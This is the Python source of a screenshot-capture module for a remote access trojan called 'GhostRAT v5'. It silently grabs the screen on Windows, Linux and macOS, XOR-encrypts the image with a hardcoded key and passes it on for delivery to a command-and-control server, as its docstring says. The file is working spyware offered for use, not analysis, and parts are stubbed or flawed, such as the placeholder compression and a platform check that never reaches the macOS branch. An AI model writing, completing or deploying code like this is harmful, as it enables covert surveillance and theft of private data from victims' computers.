"""
GhostRAT v5 — Screenshot Module (Python)

Captures screenshots and encodes results for C2 delivery.
"""

import os
import time
import base64
import subprocess
from typing import Dict, Any, Optional, Callable


class Screenshot:
    """Screenshot capture module."""

    def __init__(self, crypto_key: str = "GHOSTRATV5", quality: float = 0.7,
                 max_width: int = 1920, max_height: int = 1080):
        self.crypto_key = crypto_key
        self.quality = quality
        self.max_width = max_width
        self.max_height = max_height
        self.on_screenshot: Optional[Callable] = None

    def capture(self) -> Dict[str, Any]:
        """Capture screenshot."""
        try:
            if os.name == 'nt':
                # Windows: use PowerShell
                data = self._capture_windows()
            elif os.name == 'posix':
                # Linux: use scrot or import
                data = self._capture_linux()
            else:
                data = self._capture_macos()

            if data:
                # Compress
                compressed = self._compress(data)
                # Encrypt (data is base64 string, encode to bytes first)
                encrypted = self._xor_encrypt(compressed['data'].encode('utf-8'), self.crypto_key)

                if self.on_screenshot:
                    self.on_screenshot({
                        'data': encrypted,
                        'width': compressed.get('width', 0),
                        'height': compressed.get('height', 0),
                        'format': 'jpeg',
                        'size': len(encrypted)
                    })

                return {
                    'width': compressed.get('width', 0),
                    'height': compressed.get('height', 0),
                    'format': 'jpeg',
                    'size': len(encrypted)
                }
        except Exception as e:
            print(f"[GhostRAT v5 Screenshot] Capture error: {e}")

        return {'width': 0, 'height': 0, 'format': 'error', 'size': 0}

    def _capture_windows(self) -> Optional[str]:
        """Capture screenshot on Windows using PowerShell."""
        try:
            script = '''
            Add-Type -AssemblyName System.Windows.Forms
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
            $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
            $memoryStream = New-Object IO.MemoryStream
            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
            Write-Output $base64
            '''
            result = subprocess.run(
                ['powershell', '-Command', script],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            return None
        except Exception:
            return None

    def _capture_linux(self) -> Optional[str]:
        """Capture screenshot on Linux using scrot."""
        try:
            result = subprocess.run(
                ['scrot', '/tmp/ghostrat_screenshot.png', '--silent'],
                capture_output=True, timeout=10
            )
            if result.returncode == 0 and os.path.exists('/tmp/ghostrat_screenshot.png'):
                with open('/tmp/ghostrat_screenshot.png', 'rb') as f:
                    return base64.b64encode(f.read()).decode('utf-8')
            return None
        except Exception:
            return None

    def _capture_macos(self) -> Optional[str]:
        """Capture screenshot on macOS using screencapture."""
        try:
            result = subprocess.run(
                ['screencapture', '/tmp/ghostrat_screenshot.png'],
                capture_output=True, timeout=10
            )
            if result.returncode == 0 and os.path.exists('/tmp/ghostrat_screenshot.png'):
                with open('/tmp/ghostrat_screenshot.png', 'rb') as f:
                    return base64.b64encode(f.read()).decode('utf-8')
            return None
        except Exception:
            return None

    def _compress(self, data: str) -> Dict[str, Any]:
        """Compress screenshot data."""
        # Return metadata (actual compression would use PIL/Pillow)
        return {
            'data': data,
            'width': self.max_width,
            'height': self.max_height
        }

    def _xor_encrypt(self, data: bytes, key: str) -> bytes:
        """XOR encrypt data."""
        key_bytes = key.encode('utf-8')
        return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

    def get_stats(self) -> Dict[str, Any]:
        """Get screenshot statistics."""
        return {
            'quality': self.quality,
            'maxWidth': self.max_width,
            'maxHeight': self.max_height
        }
